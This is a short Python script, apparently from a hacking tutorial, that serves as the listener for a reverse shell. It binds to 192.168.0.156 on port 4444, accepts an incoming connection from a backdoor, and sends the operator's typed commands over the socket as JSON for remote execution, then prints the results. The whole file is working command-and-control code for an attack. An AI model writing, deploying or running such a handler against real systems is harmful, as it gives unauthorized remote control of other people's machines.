#!/usr/bin/python
import json
import socket
import jsonpickle
from json import JSONEncoder

class Listener:
    def __init__(self, ipadd, prt):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # reuse the same socket
        listener.bind((ipadd, prt))  # Socket to listin on
        listener.listen(0)
        print("[+] Waiting for incoming connection..")
        self.connection, address = listener.accept()
        print("[+] Connected to " + str(address))

    def run(self):
        while True:
            command = input(">> ")
            results = self.exec_rmtly(command)
            print(results)

    def recv_reliable(self):
        json_data = self.connection.recv(1024).decode()
        print("lis_rec data:"+ json_data)
        return json.loads(json_data)

    def send_reliable(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
        print("lis_sen data:" + json_data)

    def exec_rmtly(self, command):
        self.send_reliable(command)
        return self.recv_reliable()



while True:
    mylstn = Listener("192.168.0.156", 4444)
    mylstn.run()
